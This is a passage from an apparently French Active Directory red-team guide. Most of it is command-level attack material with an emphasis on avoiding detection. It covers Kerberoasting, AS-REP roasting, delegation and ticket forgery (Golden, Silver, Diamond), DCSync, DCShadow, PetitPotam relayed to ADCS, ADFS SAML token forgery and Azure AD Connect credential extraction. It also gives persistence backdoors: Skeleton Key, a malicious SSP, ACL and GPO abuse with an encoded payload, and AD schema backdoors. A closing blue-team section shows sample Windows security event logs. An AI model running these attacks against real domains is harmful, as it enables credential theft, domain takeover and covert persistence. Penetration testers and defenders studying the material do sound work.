   - Gestion des comptes avec des mots de passe complexes
   - Techniques pour éviter la détection
   
   ```powershell
   # Utilisation de Rubeus avec des options avancées pour éviter la détection
   Rubeus.exe kerberoast /stats           # Obtenir des statistiques sans demander de tickets
   Rubeus.exe kerberoast /nowrap          # Éviter le wrapping des hashes pour faciliter le cracking
   Rubeus.exe kerberoast /tgtdeleg        # Utiliser la délégation de TGT pour éviter les demandes directes
   Rubeus.exe kerberoast /rc4opsec        # Demander uniquement des tickets RC4 pour éviter les alertes
   
   # Utilisation de PowerShell silencieux
   $SPNs = Get-DomainUser -SPN | Select-Object -ExpandProperty SamAccountName
   foreach ($SPN in $SPNs) {
       Add-Type -AssemblyName System.IdentityModel
       New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/$SPN"
   }
   ```

#### AS-REP Roasting avancé

1. **Principes de l'AS-REP Roasting**
   - Exploitation des comptes sans pré-authentification Kerberos
   - Différences avec le Kerberoasting
   
   ```powershell
   # Rappel de la commande de base pour l'AS-REP Roasting
   Get-DomainUser -PreauthNotRequired | Format-List
   
   # Équivalent avec les outils natifs
   Get-ADUser -Filter 'userAccountControl -band 4194304' -Properties userAccountControl
   ```

2. **Techniques de découverte discrète**
   - Identification des comptes vulnérables sans alerter
   - Utilisation de requêtes LDAP ciblées
   
   ```powershell
   # Requête LDAP discrète pour identifier les comptes vulnérables
   Get-DomainUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' -Properties distinguishedname,useraccountcontrol
   
   # Utilisation de Rubeus pour une découverte plus discrète
   Rubeus.exe asreproast /format:hashcat
   ```

3. **Exploitation ciblée**
   - Demande de tickets AS-REP pour des comptes spécifiques
   - Techniques pour éviter la détection
   
   ```powershell
   # Cibler un compte spécifique avec Rubeus
   Rubeus.exe asreproast /user:targetuser /format:hashcat /nowrap
   
   # Utilisation de PowerShell silencieux
   $ASREPTargets = Get-DomainUser -PreauthNotRequired
   foreach ($Target in $ASREPTargets) {
       # Utiliser des techniques de bas niveau pour demander un AS-REP
       # Code simplifié pour l'exemple
       $ASREPBytes = [System.DirectoryServices.Protocols.LdapConnection]::GetBytes($Target.distinguishedname)
       # Traitement des bytes pour obtenir le hash
   }
   ```

#### Attaques par délégation

1. **Délégation non contrainte**
   - Principes et risques de la délégation non contrainte
   - Identification et exploitation
   
   ```powershell
   # Identifier les comptes avec délégation non contrainte
   Get-DomainComputer -Unconstrained | Select-Object -ExpandProperty dnshostname
   
   # Équivalent avec les outils natifs
   Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
   
   # Exploitation avec Rubeus (si nous avons compromis un serveur avec délégation)
   Rubeus.exe monitor /interval:5 /nowrap    # Surveiller les tickets
   # Puis forcer l'authentification d'un utilisateur privilégié
   # Et utiliser le ticket capturé
   Rubeus.exe ptt /ticket:doIFdj[...]
   ```

2. **Délégation contrainte**
   - Principes et limites de la délégation contrainte
   - Techniques d'exploitation avancées
   
   ```powershell
   # Identifier les comptes avec délégation contrainte
   Get-DomainComputer -TrustedToAuth | Select-Object -ExpandProperty dnshostname
   
   # Équivalent avec les outils natifs
   Get-ADObject -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
   
   # Exploitation avec Rubeus (S4U2self et S4U2proxy)
   # Si nous avons compromis un serveur avec délégation contrainte
   Rubeus.exe s4u /user:webservice$ /rc4:73076d0a713477102c3445ee258e5918 /impersonateuser:administrator /msdsspn:cifs/fileserver.domain.com /ptt
   ```

3. **Délégation basée sur les ressources (RBCD)**
   - Principes et avantages de la RBCD
   - Exploitation pour le mouvement latéral
   
   ```powershell
   # Vérifier si nous avons les droits pour configurer la RBCD
   $ComputerSid = Get-DomainComputer -Identity "targetcomputer" -Properties objectsid | Select-Object -ExpandProperty objectsid
   $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
   $SDBytes = New-Object byte[] ($SD.BinaryLength)
   $SD.GetBinaryForm($SDBytes, 0)
   
   # Configurer la RBCD
   Get-DomainComputer attacker | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
   
   # Exploitation avec Rubeus
   Rubeus.exe hash /password:Summer2022!
   Rubeus.exe s4u /user:attacker$ /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:administrator /msdsspn:cifs/targetcomputer.domain.com /ptt
   ```

#### Attaques sur les tickets Kerberos

1. **Golden Ticket**
   - Création et utilisation de tickets TGT forgés
   - Techniques avancées et persistance
   
   ```powershell
   # Obtenir le hash KRBTGT (nécessite déjà un accès Domain Admin)
   Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
   
   # Créer un Golden Ticket avec Mimikatz
   Invoke-Mimikatz -Command '"kerberos::golden /user:fakeadmin /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /id:500 /groups:512 /ptt"'
   
   # Créer un Golden Ticket avec Rubeus (plus discret)
   Rubeus.exe golden /rc4:4e9815869d2090ccfca61c1fe0d23986 /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:fakeadmin /id:500 /groups:512,513,518,519,520 /ptt
   ```

2. **Silver Ticket**
   - Création et utilisation de tickets TGS forgés
   - Ciblage de services spécifiques
   
   ```powershell
   # Obtenir le hash du compte de service (nécessite déjà un accès au serveur)
   Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
   
   # Créer un Silver Ticket avec Mimikatz
   Invoke-Mimikatz -Command '"kerberos::golden /user:fakeadmin /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.domain.com /service:cifs /rc4:d7e2b80507ea074ad59f152a1ba20458 /id:500 /groups:512 /ptt"'
   
   # Créer un Silver Ticket avec Rubeus
   Rubeus.exe silver /rc4:d7e2b80507ea074ad59f152a1ba20458 /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:fakeadmin /service:cifs /target:server.domain.com /ptt
   ```

3. **Diamond Ticket**
   - Modification de tickets légitimes
   - Avantages par rapport aux Golden/Silver Tickets
   
   ```powershell
   # Obtenir un TGT légitime
   Rubeus.exe asktgt /user:validuser /password:Password123 /nowrap
   
   # Modifier le ticket (Diamond Ticket)
   Rubeus.exe diamond /tgt:doIFdj[...] /ticketuser:validuser /ticketuserid:1106 /groups:512,513,518,519,520 /krbkey:4e9815869d2090ccfca61c1fe0d23986 /nowrap /ptt
   ```

### Attaques sur les relations d'approbation

#### Exploitation des approbations de forêt

1. **Principes des approbations de forêt**
   - Fonctionnement des relations d'approbation entre forêts
   - Différences avec les approbations de domaine
   
   ```powershell
   # Énumérer les relations d'approbation
   Get-DomainTrust | Format-List
   
   # Équivalent avec les outils natifs
   nltest /domain_trusts
   Get-ADTrust -Filter *
   ```

2. **Attaque SID History**
   - Exploitation de l'attribut SID History dans les approbations
   - Techniques pour obtenir des privilèges inter-forêts
   
   ```powershell
   # Vérifier si SID Filtering est désactivé (nécessaire pour l'attaque)
   Get-DomainTrust | Where-Object {$_.TrustAttributes -band 0x00000008} | Format-List
   
   # Exploitation avec Mimikatz (nécessite déjà un accès Domain Admin dans la forêt source)
   Invoke-Mimikatz -Command '"lsadump::trust /patch"'
   Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:source.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:4e9815869d2090ccfca61c1fe0d23986 /service:krbtgt /target:target.local /ticket:C:\temp\trust.kirbi"'
   ```

3. **Attaque par délégation externe**
   - Exploitation de la délégation dans les environnements multi-forêts
   - Techniques pour le mouvement latéral inter-forêts
   
   ```powershell
   # Identifier les comptes avec délégation contrainte pour des services externes
   Get-DomainObject -LDAPFilter '(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
   
   # Exploitation avec Rubeus (si nous avons compromis un serveur avec délégation)
   Rubeus.exe s4u /user:webservice$ /domain:source.local /rc4:73076d0a713477102c3445ee258e5918 /impersonateuser:administrator /msdsspn:cifs/server.target.local /ptt
   ```

#### Exploitation des approbations de domaine

1. **Principes des approbations de domaine**
   - Types d'approbations (bidirectionnelles, transitives, etc.)
   - Implications pour la sécurité
   
   ```powershell
   # Énumérer les approbations de domaine
   Get-DomainTrust -Domain domain.local | Format-List
   
   # Équivalent avec les outils natifs
   nltest /domain_trusts /domain:domain.local
   ```

2. **Attaque par transitivité**
   - Exploitation des approbations transitives
   - Techniques pour traverser plusieurs domaines
   
   ```powershell
   # Identifier les chemins d'approbation transitifs
   Get-DomainTrustMapping | Format-List
   
   # Exploitation avec Rubeus (si nous avons des identifiants dans un domaine)
   # Demander un TGT dans le domaine actuel
   Rubeus.exe asktgt /user:user /password:password /domain:domainA.local /nowrap
   
   # Utiliser ce TGT pour demander un TGS pour un service dans un domaine approuvé
   Rubeus.exe asktgs /service:cifs/server.domainB.local /domain:domainB.local /dc:dc.domainB.local /ticket:doIFdj[...] /nowrap
   ```

3. **Attaque par délégation inter-domaines**
   - Exploitation de la délégation dans les environnements multi-domaines
   - Techniques pour le mouvement latéral inter-domaines
   
   ```powershell
   # Identifier les comptes avec délégation contrainte pour des services dans d'autres domaines
   Get-DomainObject -LDAPFilter '(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))' -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
   
   # Exploitation avec Rubeus (si nous avons compromis un serveur avec délégation)
   Rubeus.exe s4u /user:webservice$ /domain:domainA.local /rc4:73076d0a713477102c3445ee258e5918 /impersonateuser:administrator /msdsspn:cifs/server.domainB.local /ptt
   ```

#### Attaques sur les contrôleurs de domaine

1. **DCSync**
   - Principes et fonctionnement de DCSync
   - Techniques avancées et ciblage sélectif
   
   ```powershell
   # Exécution de DCSync pour extraire le hash KRBTGT
   Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
   
   # Exécution de DCSync pour un utilisateur spécifique
   Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
   
   # Exécution de DCSync avec des outils alternatifs (Impacket)
   secretsdump.py -just-dc domain/user:password@dc.domain.com
   ```

2. **DCShadow**
   - Principes et fonctionnement de DCShadow
   - Techniques pour éviter la détection
   
   ```powershell
   # Exécution de DCShadow pour modifier un attribut (nécessite des privilèges élevés)
   # Terminal 1: Enregistrer un DC temporaire
   Invoke-Mimikatz -Command '"lsadump::dcshadow /object:CN=user,CN=Users,DC=domain,DC=com /attribute:userAccountControl /value:0x1000 /start"'
   
   # Terminal 2: Pousser les modifications
   Invoke-Mimikatz -Command '"lsadump::dcshadow /push"'
   
   # Exemple: Ajouter un utilisateur au groupe Domain Admins
   Invoke-Mimikatz -Command '"lsadump::dcshadow /object:CN=Domain Admins,CN=Users,DC=domain,DC=com /attribute:member /value:+CN=user,CN=Users,DC=domain,DC=com /start"'
   Invoke-Mimikatz -Command '"lsadump::dcshadow /push"'
   ```

3. **Zerologon et PetitPotam**
   - Exploitation de vulnérabilités critiques des contrôleurs de domaine
   - Techniques de mitigation et de détection
   
   ```powershell
   # Vérification de la vulnérabilité Zerologon (CVE-2020-1472)
   # Utilisation d'outils spécifiques comme zerologon_tester.py
   
   # Exploitation de PetitPotam pour forcer l'authentification NTLM
   # Utilisation d'outils comme PetitPotam.py
   python3 PetitPotam.py -d domain.com -u user -p password attacker-ip dc.domain.com
   
   # Combinaison avec un relais NTLM pour obtenir un certificat
   # Sur la machine attaquante
   ntlmrelayx.py -t http://ca.domain.com/certsrv/certfnsh.asp -smb2support --adcs
   ```

### Attaques sur les services d'infrastructure

#### Exploitation d'ADCS (Active Directory Certificate Services)

1. **Principes d'ADCS**
   - Rôle et fonctionnement d'ADCS dans un environnement AD
   - Implications pour la sécurité
   
   ```powershell
   # Énumérer les services ADCS
   Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
   
   # Énumérer les modèles de certificats
   Get-ADObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties *
   ```

2. **ESC1 à ESC8 (Escalation via Certificate Services)**
   - Différentes techniques d'exploitation des modèles de certificats
   - Identification et exploitation des vulnérabilités
   
   ```powershell
   # Utilisation de Certify pour énumérer les vulnérabilités
   Certify.exe find /vulnerable
   
   # Exploitation d'ESC1 (modèle de certificat avec authentification client et EKU permettant l'authentification)
   Certify.exe request /ca:ca.domain.com\CA /template:VulnerableTemplate /altname:administrator
   
   # Utilisation du certificat pour demander un TGT
   Rubeus.exe asktgt /user:administrator /certificate:base64certificate /password:password /ptt
   ```

3. **Relais NTLM vers ADCS**
   - Techniques pour forcer l'authentification et relayer vers ADCS
   - Exploitation pour obtenir des certificats privilégiés
   
   ```powershell
   # Utilisation de PetitPotam pour forcer l'authentification
   python3 PetitPotam.py -d domain.com -u user -p password attacker-ip dc.domain.com
   
   # Relais vers ADCS avec ntlmrelayx
   ntlmrelayx.py -t http://ca.domain.com/certsrv/certfnsh.asp -smb2support --adcs
   
   # Utilisation du certificat obtenu
   Rubeus.exe asktgt /user:dc$ /certificate:base64certificate /ptt
   ```

#### Exploitation de ADFS (Active Directory Federation Services)

1. **Principes d'ADFS**
   - Rôle et fonctionnement d'ADFS dans un environnement AD
   - Implications pour la sécurité
   
   ```powershell
   # Énumérer les services ADFS
   Get-ADFSProperties
   
   # Identifier les applications de confiance
   Get-ADFSRelyingPartyTrust
   ```

2. **Extraction de clés et de tokens**
   - Techniques pour extraire les clés de signature ADFS
   - Création de tokens SAML forgés
   
   ```powershell
   # Extraction des clés de signature (nécessite un accès au serveur ADFS)
   Invoke-Mimikatz -Command '"crypto::certificates /export"'
   
   # Utilisation d'outils spécifiques comme ADFSDump
   ADFSDump.exe --server adfs.domain.com --database ADFSConfiguration
   
   # Création de tokens SAML forgés avec AADInternals
   Import-Module AADInternals
   New-AADIntSAMLToken -ImmutableID "user@domain.com" -Issuer "http://adfs.domain.com/adfs/services/trust" -TargetService "urn:federation:MicrosoftOnline" -Certificate $cert
   ```

3. **Attaques sur les applications fédérées**
   - Exploitation des configurations d'applications fédérées
   - Techniques pour accéder aux ressources protégées
   
   ```powershell
   # Identifier les applications vulnérables
   Get-ADFSRelyingPartyTrust | Where-Object {$_.EncryptClaims -eq $false}
   
   # Exploitation avec des tokens SAML forgés
   # Utilisation d'outils comme SAML Raider ou SAML Toolkit
   ```

#### Exploitation d'Azure AD Connect

1. **Principes d'Azure AD Connect**
   - Rôle et fonctionnement d'Azure AD Connect
   - Implications pour la sécurité hybride
   
   ```powershell
   # Vérifier la présence d'Azure AD Connect
   Get-ADUser -Filter {Name -like "MSOL_*"} -Properties *
   ```

2. **Extraction d'identifiants**
   - Techniques pour extraire les identifiants stockés par Azure AD Connect
   - Exploitation pour l'accès à Azure AD et AD on-premises
   
   ```powershell
   # Utilisation de l'outil AADConnectPasswordExtraction (nécessite un accès au serveur Azure AD Connect)
   Import-Module .\AADConnectPasswordExtraction.ps1
   Get-AADConnectPassword
   
   # Alternative avec Mimikatz
   Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets"'
   ```

3. **Attaques sur la synchronisation**
   - Exploitation des mécanismes de synchronisation
   - Techniques pour forcer la synchronisation d'attributs malveillants
   
   ```powershell
   # Forcer une synchronisation (nécessite des privilèges sur le serveur Azure AD Connect)
   Start-ADSyncSyncCycle -PolicyType Delta
   
   # Modification d'attributs critiques avant synchronisation
   # Exemple: Modifier l'attribut ImmutableID pour usurper un compte
   ```

### Techniques de persistance avancées

#### Backdoors basées sur Kerberos

1. **Skeleton Key**
   - Principes et fonctionnement de Skeleton Key
   - Techniques d'implantation et limitations
   
   ```powershell
   # Implantation de Skeleton Key (nécessite un accès au DC)
   Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
   
   # Utilisation de la Skeleton Key
   # Tous les utilisateurs peuvent maintenant s'authentifier avec le mot de passe "mimikatz"
   Enter-PSSession -ComputerName dc.domain.com -Credential (Get-Credential)
   # Utiliser n'importe quel nom d'utilisateur avec le mot de passe "mimikatz"
   ```

2. **Custom SSP (Security Support Provider)**
   - Implantation de SSP malveillants
   - Techniques pour capturer les identifiants
   
   ```powershell
   # Implantation d'un SSP malveillant (nécessite un accès au DC)
   Invoke-Mimikatz -Command '"privilege::debug" "misc::memssp"'
   
   # Alternative: Ajouter un SSP personnalisé au registre
   $path = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
   $value = (Get-ItemProperty -Path $path -Name "Security Packages").PSObject.Properties["Security Packages"].Value
   $newValue = $value + "," + "mimilib"
   Set-ItemProperty -Path $path -Name "Security Packages" -Value $newValue
   
   # Les identifiants seront enregistrés dans C:\Windows\System32\kiwissp.log
   ```

3. **Golden Ticket à long terme**
   - Création de tickets avec une durée de vie étendue
   - Techniques pour éviter la détection
   
   ```powershell
   # Création d'un Golden Ticket avec une durée de vie de 10 ans (nécessite le hash KRBTGT)
   Invoke-Mimikatz -Command '"kerberos::golden /user:fakeadmin /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /id:500 /groups:512 /startoffset:0 /endin:5256000 /renewmax:5256000 /ptt"'
   
   # Création avec Rubeus (plus discret)
   Rubeus.exe golden /rc4:4e9815869d2090ccfca61c1fe0d23986 /domain:domain.com /sid:S-1-5-21-1234567890-1234567890-1234567890 /user:fakeadmin /id:500 /groups:512,513,518,519,520 /startoffset:0 /endin:5256000 /renewmax:5256000 /ptt
   ```

#### Backdoors basées sur les ACL

1. **Droits GenericAll**
   - Attribution de droits complets sur des objets critiques
   - Techniques d'exploitation et de persistance
   
   ```powershell
   # Attribuer des droits GenericAll à un utilisateur compromis
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "compromiseduser" -Rights All
   
   # Exploitation ultérieure
   Add-DomainGroupMember -Identity "Domain Admins" -Members "compromiseduser"
   ```

2. **Droits WriteDACL**
   - Attribution de droits de modification des ACL
   - Techniques pour créer des backdoors discrètes
   
   ```powershell
   # Attribuer des droits WriteDACL à un utilisateur compromis
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "compromiseduser" -Rights WriteDacl
   
   # Exploitation ultérieure
   Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "compromiseduser" -Rights All
   Add-DomainGroupMember -Identity "Domain Admins" -Members "compromiseduser"
   ```

3. **Droits sur les GPO**
   - Attribution de droits sur les GPO critiques
   - Techniques pour déployer des backdoors via GPO
   
   ```powershell
   # Identifier les GPO appliquées aux administrateurs
   Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier -match $(Convert-NameToSid "compromiseduser")}
   
   # Attribuer des droits sur une GPO
   Add-DomainObjectAcl -TargetIdentity "GPO_NAME" -PrincipalIdentity "compromiseduser" -Rights All
   
   # Exploitation ultérieure: Modifier la GPO pour déployer une tâche planifiée
   # Utiliser des outils comme SharpGPOAbuse
   SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "powershell.exe" --Arguments "-enc BASE64_PAYLOAD" --GPOName "GPO_NAME"
   ```

#### Backdoors basées sur les schémas

1. **Extension de schéma**
   - Modification du schéma AD pour ajouter des attributs malveillants
   - Techniques pour stocker des données persistantes
   
   ```powershell
   # Vérifier les droits sur le schéma (nécessite des privilèges élevés)
   Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=domain,DC=com" -LDAPFilter "(objectClass=attributeSchema)" -Properties *
   
   # Ajouter un nouvel attribut au schéma
   $schemaNC = (Get-ADRootDSE).schemaNamingContext
   $attributeOID = "1.2.840.113556.1.8000.2554.12345.6789.1"
   
   New-ADObject -Name "backdoorAttribute" -Type "attributeSchema" -Path $schemaNC -OtherAttributes @{
       'attributeID' = $attributeOID
       'attributeSyntax' = '2.5.5.3'  # Unicode String
       'isSingleValued' = $true
       'searchFlags' = 0
       'adminDisplayName' = 'backdoorAttribute'
       'lDAPDisplayName' = 'backdoorAttribute'
       'showInAdvancedViewOnly' = $true
   }
   
   # Ajouter l'attribut à une classe existante
   $classNC = "CN=Person,CN=Schema,CN=Configuration,DC=domain,DC=com"
   $class = Get-ADObject -Identity $classNC -Properties mayContain
   $newMayContain = $class.mayContain + @("backdoorAttribute")
   Set-ADObject -Identity $classNC -Replace @{mayContain = $newMayContain}
   
   # Utiliser l'attribut pour stocker des données
   Set-ADUser -Identity "user" -Add @{'backdoorAttribute' = 'malicious data'}
   ```

2. **Modification d'attributs système**
   - Utilisation d'attributs existants pour stocker des données malveillantes
   - Techniques pour éviter la détection
   
   ```powershell
   # Utiliser des attributs peu surveillés pour stocker des données
   Set-ADUser -Identity "user" -Description "legitimate description $(ConvertTo-SecureString 'malicious data' -AsPlainText -Force | ConvertFrom-SecureString)"
   
   # Utiliser des attributs binaires
   $maliciousData = [System.Text.Encoding]::Unicode.GetBytes("malicious data")
   Set-ADUser -Identity "user" -Replace @{'thumbnailPhoto' = $maliciousData}
   ```

3. **Backdoors basées sur les classes auxiliaires**
   - Utilisation de classes auxiliaires pour ajouter des attributs malveillants
   - Techniques pour étendre les objets existants
   
   ```powershell
   # Identifier les classes auxiliaires disponibles
   Get-ADObject -SearchBase "CN=Schema,CN=Configuration,DC=domain,DC=com" -LDAPFilter "(objectClass=classSchema)(auxiliaryClass=*)" -Properties auxiliaryClass
   
   # Ajouter une classe auxiliaire à un objet
   $user = Get-ADUser -Identity "user" -Properties objectClass
   $newObjectClass = $user.objectClass + @("someAuxiliaryClass")
   Set-ADUser -Identity "user" -Replace @{objectClass = $newObjectClass}
   
   # Utiliser les attributs de la classe auxiliaire
   Set-ADUser -Identity "user" -Add @{'attributeFromAuxiliaryClass' = 'malicious data'}
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les attaques Kerberos

1. **Logs d'événements Kerberos**
   - Événements liés aux demandes de tickets
   - Anomalies dans les attributs des tickets
   
   **Exemple de log (Event ID 4769) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4769
   Task Category: Kerberos Service Ticket Operations
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      DC.domain.com
   Description:
   A Kerberos service ticket was requested.
   
   Account Information:
       Account Name:         user@DOMAIN.COM
       Account Domain:       DOMAIN.COM
       Logon GUID:           {1234567A-890B-1234-C567-8D901EFG2H3I}
   
   Service Information:
       Service Name:         HTTP/server.domain.com
       Service ID:           NULL SID
   
   Network Information:
       Client Address:       ::ffff:192.168.1.100
       Client Port:          49267
   
   Additional Information:
       Ticket Options:       0x40810000
       Ticket Encryption Type:       0x12
       Failure Code:         0x0
       Transited Services:   -
   
   This event is generated every time a Kerberos service ticket is requested. It is logged on the computer that hosts the domain controller.
   ```

2. **Logs d'événements d'authentification**
   - Événements liés aux authentifications réussies et échouées
   - Anomalies dans les méthodes d'authentification
   
   **Exemple de log (Event ID 4624) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4624
   Task Category: Logon
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      DC.domain.com
   Description:
   An account was successfully logged on.
   
   Subject:
       Security ID:          SYSTEM
       Account Name:         DC$
       Account Domain:       DOMAIN
       Logon ID:             0x3E7
   
   Logon Information:
       Logon Type:           3
       Restricted Admin Mode:    -
       Virtual Account:      No
       Elevated Token:       Yes
   
   Impersonation Level:      Impersonation
   
   New Logon:
       Security ID:          DOMAIN\Administrator
       Account Name:         Administrator
       Account Domain:       DOMAIN
       Logon ID:             0x115BAB
       Logon GUID:           {1234567A-890B-1234-C567-8D901EFG2H3I}
   
   Process Information:
       Process ID:           0x374
       Process Name:         C:\Windows\System32\lsass.exe
   
   Network Information:
       Workstation Name:     CLIENT
       Source Network Address:   192.168.1.100
       Source Port:          49268
   
   Detailed Authentication Information:
       Logon Process:        Kerberos
       Authentication Package:   Kerberos
       Transited Services:   -
       Package Name (NTLM only):    -
       Key Length:           0
   
   This event is generated when a logon session is created. It is generated on the computer that was accessed.
   ```

3. **Logs d'événements de modification de compte**
   - Événements liés aux modifications d'attributs de compte
   - Anomalies dans les privilèges accordés
   
   **Exemple de log (Event ID 4738) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4738
   Task Category: User Account Management
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      DC.domain.com
   Description:
   A user account was changed.
   
   Subject:
       Security ID:          DOMAIN\Administrator
       Account Name:         Administrator
       Account Domain:       DOMAIN
       Logon ID:             0x115BAB
   
   Target Account:
       Security ID:          DOMAIN\user
       Account Name:         user
       Account Domain:       DOMAIN
   
   Changed Attributes:
       SAM Account Name:     -
       Display Name:         -
       User Principal Name:  -
       Home Directory:       -
       Home Drive:           -
       Script Path:          -
       Profile Path:         -
       User Workstations:    -
       Password Last Set:    -
       Account Expires:      -
       Primary Group ID:     -
       AllowedToDelegateTo:  -
       Old UAC Value:        0x15
       New UAC Value:        0x211
       User Account Control: 
           Account Disabled:         False
           Home Directory Required:  False
           Password Not Required:    False
           Temporary Duplicate Account:  False
           Normal Account:           True
           Password Doesn't Expire:  True
           MNS Logon Account:        False
           Smartcard Required:       False
           Trusted For Delegation:   True
           Not Delegated:            False
           Use DES Key Only:         False
           Don't Require Preauth:    False
           Password Expired:         False
           Trusted To Auth For Delegation: False
           No Auth Data Required:    False
       SID History:          -
       Logon Hours:          -
   
   Additional Information:
       Privileges:           -
   ```

#### Traces générées par les attaques sur les relations d'approbation

1. **Logs d'événements de réplication**
   - Événements liés à la réplication AD
   - Anomalies dans les opérations de réplication
   
   **Exemple de log (Event ID 4662) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4662
   Task Category: Directory Service Access
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      DC.domain.com
   Description:
   An operation was performed on an object.
   
   Subject:
       Security ID:          DOMAIN\user
       Account Name:         user
       Account Domain:       DOMAIN
       Logon ID:             0x115BAB
   
   Object:
       Object Server:        DS
       Object Type:          domainDNS
       Object Name:          DC=domain,DC=com
       Handle ID:            0x0
       Operation Type:       Control Access
   
   Properties:
       Property 1:           -
       Property 2:           -
   
   Additional Information:
       Parameter 1:          DS-Replication-Get-Changes-All
       Parameter 2:          -
   ```

2. **Logs d'événements d'authentification inter-domaines**
   - Événements liés aux authentifications entre domaines
   - Anomalies dans les tickets inter-domaines
   
   **Exemple de log (Event ID 4768) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4768
   Task Category: Kerberos Authentication Service
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      DC.domain.com
   Description:
   A Kerberos authentication ticket (TGT) was requested.
   
   Account Information:
       Account Name:         user@DOMAIN.COM
       Supplied Realm Name:  DOMAIN.COM
       User ID:              DOMAIN\user
   
   Service Information:
       Service Name:         krbtgt/DOMAIN.COM
       Service ID:           NULL SID
   
   Network Information:
       Client Address:       ::ffff:192.168.1.100
       Client Port:          49269
   
   Additional Information:
       Ticket Options:       0x40800000
       Result Code:          0x0
       Ticket Encryption Type:       0x12
       Pre-Authentication Type:      2
   
   Certificate Information:
       Certificate Issuer Name:      
       Certificate Serial Number:    
       Certificate Thumbprint:       
   
   Certificate information is only provided if a certificate was used for pre-authentication.
   
   Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
   ```

3. **Logs d'événements de modification de sécurité**
   - Événements liés aux modifications des paramètres de sécurité
   - Anomalies dans les configurations de sécurité
   
   **Exemple de log (Event ID 4739) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4739
   Task Category: Domain Policy Change
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      DC.domain.com
   Description:
   Domain Policy was changed.
   
   Subject:
       Security ID:          DOMAIN\Administrator
       Account Name:         Administrator
       Account Domain:       DOMAIN
       Logon ID:             0x115BAB
   
   Domain Policy:
       Domain:               DOMAIN.COM
       Policy Change:        Trust Partner
       Changed By:           DOMAIN\Administrator
       Old Value:            -
       New Value:            -
   ```

#### Traces générées par les attaques sur les services d'infrastructure

1. **Logs d'événements ADCS**
   - Événements liés aux opérations de certificats
   - Anomalies dans les demandes de certificats
   
   **Exemple de log (Event ID 4887) :**
   ```
   Log Name:      Security
   Source:        Microsoft-Windows-Security-Auditing
   Event ID:      4887
   Task Category: Certificate Services
   Level:         Information
   Keywords:      Audit Success
   User:          N/A
   Computer:      CA.domain.com
   Description:
   Certificate Services approved a certificate request and issued a certificate.
   
   Subject:
       Security ID:          DOMAIN\user
       Account Name:         user
       Account Domain:       DOMAIN
       Logon ID:             0x115BAB
   
   Certificate Request Information:
       Request ID:           123
       Request Type:         User
       Requester Name:       user@domain.com
       Requester ID:         DOMAIN\user
   
   Certificate Information:
       Serial Number:        1a2b3c4d5e6f7g8h9i0j
       Certificate Template:  User
       Requester Name:       CN=user,OU=Users,DC=domain,DC=com
       Requester ID:         DOMAIN\user
       Subject Name:         CN=user,OU=Users,DC=domain,DC=com
       Subject Alternative Name: user@domain.com
       Issued:               Yes
       Certificate Hash:     1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t
       Certificate Type:     User
   ```

2. **Logs d'événements ADFS**
   - Événements liés aux opérations de fédération
